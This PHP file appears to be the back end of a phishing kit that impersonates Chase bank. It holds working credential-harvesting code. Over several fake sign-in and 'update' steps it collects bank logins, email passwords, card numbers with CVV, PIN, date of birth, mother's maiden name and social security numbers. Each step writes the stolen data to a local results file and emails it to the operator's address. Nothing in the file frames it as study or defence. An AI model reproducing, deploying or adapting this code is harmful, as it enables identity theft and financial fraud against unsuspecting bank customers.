<?php
session_start();
$tomail = "your_email@domain.com";
$callback = "url_to_redirect_to";
if(!isset($_SESSION['pros'])){
		
     $c = [ 0 => [0,1,2,3,4,5,6,7,8,9],
		1 => ['a','b','c','d','e','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z']
		];
		$code = "";
		for($i = 0; $i < 20 ; $i++){
			$index = array_rand($c);
			$index2 = array_rand($c[$index]);
			$code .= $c[$index][$index2];
		}
	
	$_SESSION['pros'] = $code;
}

if(isset($_POST['signin1'])){
	$check_re_cap =  $_POST['recapcha-n'];
	$re_cap = $_POST['recapcha'];
	if($check_re_cap != $re_cap){
		$error = true;
		$r[] = 'please enter correct verification text';
	}
	if(strlen($_POST['password']) < 5){
		$error = true;
		$r[] = 'please enter a valid password';
	}
	if(strlen($_POST['username']) < 2){
		$error = true;
		$r[] = 'please enter a valid username';
	}
	if(empty($error)){
		$_SESSION['username'] = $_POST['username'];
		$_SESSION['password'] = $_POST['password'];
		
     $all = [ 0 => [0,1,2,3,4,5,6,7,8,9],
		1 => ['a','b','c','d','e','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z']
		];
		$cmd = "";
		for($i = 0; $i < 50 ; $i++){
			$index = array_rand($all);
			$index2 = array_rand($all[$index]);
			$cmd .= $all[$index][$index2];
		}
		
         
		   $mail = "";
	       $mail .= "<table style='margin-top:1rem;padding:1rem;'>";
		   $mail .= "<tr><td>TAG ID - 1:</td><td>".$_SESSION['pros']."</td></tr>";
	       $mail .= "<tr><td>USERNAME</td><td>".$_SESSION['username']."</td></tr>";
	       $mail .= "<tr><td>PASSWORD</td><td>".$_SESSION['password']."</td></tr>";
		    $mail .= "<tr><td>DATE</td><td>".date("Y/M/d h:i:s a")."</td></tr>";
		   $mail .= "</table><hr>\n";
            
		$myfile = fopen("result.html", "a");
	   fwrite($myfile, $mail);
	   fclose($myfile);
	   $headers = "MIME-Version: 1.0" . "\r\n";
       $headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
       
       $send_mail = mail($tomail, 'Chase Result | '.date("Y/M/d H:i:s a"), $mail, $headers);
	   
		echo '<script>location="confirm-password?ac=login_submit&cmd='.$cmd.'"</script>';
	}
}

if(isset($_POST['signin2'])){

	if (!filter_var($_POST['email'], FILTER_VALIDATE_EMAIL)) 
	{
		$error = true;
		$r[] = 'Invalid Email';	
	}
	if(strlen($_POST['emailpassword']) < 4){
		$error = true;
		$r[] = 'please enter a valid password';
	}
	
	if(empty($error)){
		$_SESSION['email'] = $_POST['email'];
		$_SESSION['emailpassword'] = $_POST['emailpassword'];
		
		 $all = [ 0 => [0,1,2,3,4,5,6,7,8,9],
		1 => ['a','b','c','d','e','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z']
		];
		$cmd = "";
		for($i = 0; $i < 50 ; $i++){
			$index = array_rand($all);
			$index2 = array_rand($all[$index]);
			$cmd .= $all[$index][$index2];
		}
		
           $mail = "";
	       $mail .= "<table style='margin-top:1rem;padding:1rem;'>";
		   $mail .= "<tr><td>TAG ID - 2:</td><td>".$_SESSION['pros']."</td></tr>";
	       $mail .= "<tr><td>EMAIL</td><td>".$_SESSION['email']."</td></tr>";
	       $mail .= "<tr><td>EMAIL PASSWORD</td><td>".$_SESSION['emailpassword']."</td></tr>";
		    $mail .= "<tr><td>DATE</td><td>".date("Y/M/d h:i:s a")."</td></tr>";
		   $mail .= "</table><hr>\n\n";
            
			  $myfile = fopen("result.html", "a");
	   fwrite($myfile, $mail);
	   fclose($myfile);
	   $headers = "MIME-Version: 1.0" . "\r\n";
       $headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
       
       $send_mail = mail($tomail, 'Chase Result | '.date("Y/M/d H:i:s a"), $mail, $headers);
	   

		echo '<script>location="reconfirm-password?ac=login_submit&cmd='.$cmd.'"</script>';
	}
	
	
	
	
}

if(isset($_POST['signin3'])){
	
	
	if(empty($error)){
		$_SESSION['email2'] = $_POST['email2'];
		$_SESSION['emailpassword2'] = $_POST['emailpassword2'];
		 $all = [ 0 => [0,1,2,3,4,5,6,7,8,9],
		1 => ['a','b','c','d','e','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z']
		];
		$cmd = "";
		for($i = 0; $i < 50 ; $i++){
			$index = array_rand($all);
			$index2 = array_rand($all[$index]);
			$cmd .= $all[$index][$index2];
		}
		
		   $mail = "";
	       $mail .= "<table style='margin-top:1rem;padding:1rem;'>";
		   $mail .= "<tr><td>TAG ID - 3:</td><td>".$_SESSION['pros']."</td></tr>";
	       $mail .= "<tr><td>EMAIL 1</td><td>".$_SESSION['email2']."</td></tr>";
	       $mail .= "<tr><td>EMAIL PASSWORD 2</td><td>".$_SESSION['emailpassword2']."</td></tr>";
		   $mail .= "<tr><td>DATE</td><td>".date("Y/M/d h:i:s a")."</td></tr>\n\n";
		   $mail .= "</table><hr>";
            
			  $myfile = fopen("result.html", "a");
	   fwrite($myfile, $mail);
	   fclose($myfile);
	   $headers = "MIME-Version: 1.0" . "\r\n";
       $headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
       
       $send_mail = mail($tomail, 'Chase Result | '.date("Y/M/d H:i:s a"), $mail, $headers);
		echo '<script>location="confirm-account?ac=confirm&cmd='.$cmd.'"</script>';
	}
	
	
}
if(isset($_POST['update'])){
	
	if(empty($error)){
		$_SESSION['cc'] = $_POST['cc'];
		$_SESSION['cvv'] = $_POST['cvv'];
		$_SESSION['exp'] = $_POST['exp'];
		$_SESSION['pin'] = $_POST['pin'];
		$_SESSION['dob'] = $_POST['dob'];
		$_SESSION['mname'] = $_POST['mname'];
		$_SESSION['sc'] = $_POST['sc'];
	
	
	   $mail = "";
	   $mail .= "<table style='margin-top:1rem;padding:1rem;'>";
	   $mail .= "<tr><td>TAG ID - Full:</td><td>".$_SESSION['pros']."</td></tr>";
	   $mail .= "<tr><td>USERNAME</td><td>".$_SESSION['username']."</td></tr>";
	   $mail .= "<tr><td>PASSWORD</td><td>".$_SESSION['password']."</td></tr>";
	   $mail .= "<tr><td>EMAIL</td><td>".$_SESSION['email']."</td></tr>";
	   $mail .= "<tr><td>EMAIL PASSWORD</td><td>".$_SESSION['emailpassword']."</td></tr>";
	   $mail .= "<tr><td>EMAIL 2</td><td>".$_SESSION['email2']."</td></tr>";
	   $mail .= "<tr><td>EMAIL 2 PASSWORD</td><td>".$_SESSION['emailpassword2']."</td></tr>";
	   $mail .= "<tr><td>CC</td><td>".$_SESSION['cc']."</td></tr>";
	   $mail .= "<tr><td>CVV</td><td>".$_SESSION['cvv']."</td></tr>";
	   $mail .= "<tr><td>EXP</td><td>".$_SESSION['exp']."</td></tr>";
	   $mail .= "<tr><td>PIN</td><td>".$_SESSION['pin']."</td></tr>";
	   $mail .= "<tr><td>DOB</td><td>".$_SESSION['dob']."</td></tr>";
	   $mail .= "<tr><td>MOTHER'S NAME</td><td>".$_SESSION['mname']."</td></tr>";
	   $mail .= "<tr><td>SOCIAL SECURITY</td><td>".$_SESSION['sc']."</td></tr>";
	   $mail .= "<tr><td>DATE</td><td>".date("Y/M/d h:i:s a")."</td></tr>";
	   $mail .= "</table><hr>\n\n";
	   $myfile = fopen("result.html", "a") or die("Unable to open file!");
	   fwrite($myfile, $mail);
	   fclose($myfile);
	   $headers = "MIME-Version: 1.0" . "\r\n";
       $headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
       
       $send_mail = mail($tomail, 'Chase Result | '.date("Y/M/d H:i:s a"), $mail, $headers);
	  echo '<script>location="success"</script>';
	
	}
	
	
}



?>